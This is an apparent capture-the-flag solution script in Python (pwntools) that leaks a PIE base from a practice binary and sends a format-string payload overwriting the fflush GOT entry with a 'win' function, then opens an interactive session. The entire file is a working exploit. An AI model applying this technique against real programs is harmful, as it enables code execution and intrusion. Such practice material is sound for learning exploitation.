import pwn
pwn.context.clear(arch='amd64', os='linux')
pwn.context.terminal = ['tmux','splitw','-h']
elf = pwn.context.binary = pwn.ELF("./chall")
if pwn.args.GDB:
    p = pwn.gdb.debug(elf.path,gdbscript='''b *warmup+48\nc''')
elif pwn.args.REMOTE:
    p = pwn.remote("gc1.eng.run",30613)
else:
    p = elf.process()
#function to tell the order of wins in ascending order return e.g [1,3,2]
def compr(win1,win2,win3,addr):
    off_dict = {win1:addr,win2:addr+2,win3:addr+4}
    addr1 = off_dict[min(win1,win2,win3)]
    addr3 = off_dict[max(win1,win2,win3)]
    addr2 = off_dict[(win1+win2+win3) - max(win1,win2,win3) - min(win1,win2,win3)]
    return [addr1,addr2,addr3]   
p.recvuntil(b": ")
leak = int(p.recvline().strip(),16)
elf.address = leak - elf.sym.main
pwn.log.info("FFLUSH: "+hex(elf.got.fflush))
pwn.log.info("WIN: "+hex(elf.sym.win))
win1 = elf.sym.win & 0xffff
pwn.log.info("WIN1: "+hex(win1))
win2 = elf.sym.win >> 16 & 0xffff
pwn.log.info("WIN2: "+hex(win2))
win3 = elf.sym.win >> 32 & 0xffff
pwn.log.info("WIN3: "+hex(win3))
val1 = min(win1,win2,win3)
val2 = (win1+win2+win3 - max(win1,win2,win3) - min(win1,win2,win3))
val3 = max(win1,win2,win3)
payload = f"%{val1}x%12$hn.".encode().ljust(16,b'A')
payload += f"%{val2 - val1 - 3}x%13$hn.".encode().ljust(16,b'A')
payload += f"%{val3 - val2 - 4}x%14$hn.".encode().ljust(16,b'A')
addr_list = compr(win1,win2,win3,elf.got.fflush)
payload += pwn.p64(addr_list[0])
payload += pwn.p64(addr_list[1])
payload += pwn.p64(addr_list[2])
payload += (128 - len(payload))*b"A"
p.sendline(payload)
p.interactive()